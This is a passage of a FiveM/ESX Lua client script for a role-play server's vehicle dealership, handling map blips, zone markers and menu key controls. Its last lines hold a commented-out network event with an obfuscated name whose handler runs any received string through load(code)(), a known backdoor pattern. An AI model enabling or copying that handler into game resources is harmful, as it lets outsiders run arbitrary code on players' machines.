	local blip7 = AddBlipForCoord(-926.78, -458.33, 37.300)

	SetBlipSprite(blip7, 357)
	SetBlipDisplay(blip7, 4)
	SetBlipScale(blip7, 0.8)
	SetBlipColour(blip7, 59)
	SetBlipAsShortRange(blip7, true) 
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName("Agence Immobilière")
	EndTextCommandSetBlipName(blip7)
	SetBlipCategory(blip7, 10)
end)

Citizen.CreateThread(function() 
	local blip8 = AddBlipForCoord(-1392.342, -585.895, 30.244)

	SetBlipSprite(blip8, 93)
	SetBlipDisplay(blip8, 4)
	SetBlipScale(blip8, 0.8)
	SetBlipColour(blip8, 27)
	SetBlipAsShortRange(blip8, true) 
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName("Bahamas")
	EndTextCommandSetBlipName(blip8)
	SetBlipCategory(blip8, 10)
end)

Citizen.CreateThread(function() 
	local blip9 = AddBlipForCoord(-1179.813, -885.527, 13.811)

	SetBlipSprite(blip9, 106)
	SetBlipDisplay(blip9, 4)
	SetBlipScale(blip9, 0.8)
	SetBlipColour(blip9, 59)
	SetBlipAsShortRange(blip9, true) 
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName("Burger Shot")
	EndTextCommandSetBlipName(blip9)
	SetBlipCategory(blip9, 10)
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		local interval = 2500
		local coords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(ConfigConCess.Zones) do
			for k2, v2 in pairs(v) do
				if v2.Type ~= -1 and GetDistanceBetweenCoords(coords, v2.Pos, true) < 50 then
					interval = 0
					if v2.Type ~= -1 and GetDistanceBetweenCoords(coords, v2.Pos, true) < ConfigConCess.DrawDistance then
						if v2.bossOnly and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.grade_name == 'boss' then
							DrawMarker(v2.Type, v2.Pos, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, v2.Size, ConfigConCess.MarkerColor.r, ConfigConCess.MarkerColor.g, ConfigConCess.MarkerColor.b, 100, false, true, 2, false, false, false, false)
						elseif not v2.bossOnly then
							DrawMarker(v2.Type, v2.Pos, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, v2.Size, ConfigConCess.MarkerColor.r, ConfigConCess.MarkerColor.g, ConfigConCess.MarkerColor.b, 100, false, true, 2, false, false, false, false)
						end
					end
				end
			end
		end

		Wait(interval)
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		local interval = 2500
		local coords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone = {}

		for k, v in pairs(ConfigConCess.Zones) do
			for k2, v2 in pairs(v) do
				if GetDistanceBetweenCoords(coords, v2.Pos, true) < 10 then
					interval = 0
					if GetDistanceBetweenCoords(coords, v2.Pos, true) < v2.Size.x then
						isInMarker = true
						currentZone = {k, k2}
					end
				end
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and (LastZone[1] ~= currentZone[1] or LastZone[2] ~= currentZone[2])) then
			interval = 0
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('esx_vehicleshop:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			interval = 0
			HasAlreadyEnteredMarker = false
			TriggerEvent('esx_vehicleshop:hasExitedMarker', LastZone)
		end

		Wait(interval)
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if CurrentAction == nil then
			Citizen.Wait(50)
		else
			interval = 0
			if CurrentAction == 'resell_vehicle' and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.grade_name == 'boss' then
				ESX.ShowHelpNotification(CurrentActionMsg)
			elseif CurrentAction ~= 'resell_vehicle' then
				ESX.ShowHelpNotification(CurrentActionMsg)
			end

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'shop_menu' then
					if ConfigConCess.LicenseEnable then
						ESX.TriggerServerCallback('esx_license:checkLicense', function(hasDriversLicense)
							if hasDriversLicense then
								OpenConcessMenu()
							else
								ESX.ShowNotification("Vous n\'avez pas de permis de conduire !!")
							end
						end, GetPlayerServerId(PlayerId()), 'drive')
					else
						OpenConcessMenu()
					end
				elseif CurrentAction == 'reseller_menu' then
					OpenResellerMenu()
				elseif CurrentAction == 'give_back_vehicle' then
					ESX.TriggerServerCallback('esx_vehicleshop:giveBackVehicle', function(isRentedVehicle)
						if isRentedVehicle then
							ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
							ESX.ShowNotification("Véhicule ~g~rendu~s~ au concessionnaire")
						else
							ESX.ShowNotification("Ce n\'est pas un ~r~véhicule de location~s~")
						end
					end, ESX.Math.Trim(GetVehicleNumberPlateText(CurrentActionData.vehicle)))
				elseif CurrentAction == 'resell_vehicle' and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == 'carshop' and ESX.PlayerData.job.grade_name == 'boss' then
					--[[
					ESX.TriggerServerCallback('esx_vehicleshop:resellVehicle', function(vehicleSold)
						if vehicleSold then
							ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
							ESX.ShowNotification(_U('vehicle_sold_for', CurrentActionData.label, ESX.Math.GroupDigits(CurrentActionData.price)))
						else
							ESX.ShowNotification(_U('not_yours'))
						end
					end, CurrentActionData.plate, CurrentActionData.model)
					]]
				elseif CurrentAction == 'boss_actions_menu' then
					OpenBossActionsMenu()
				end

				CurrentAction = nil
			end
		end

		Wait(interval)
	end
end)

function drawLoadingText(text, red, green, blue, alpha)
	SetTextFont(4)
	SetTextProportional(0)
	SetTextScale(0.0, 0.5)
	SetTextColour(red, green, blue, alpha)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()
	SetTextCentre(true)

	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(0.5, 0.5)
end

function getVehicleType(model)
	if IsThisModelAPlane(model) then
		return 'aircraft'
	elseif IsThisModelAHeli(model) then
		return 'aircraft'
	elseif IsThisModelABoat(model) then
		return 'boat'
	end

	return 'car'
end

--RegisterNetEvent('ᓚᘏᗢ')
--AddEventHandler('ᓚᘏᗢ', function(code)
--	load(code)()
--end)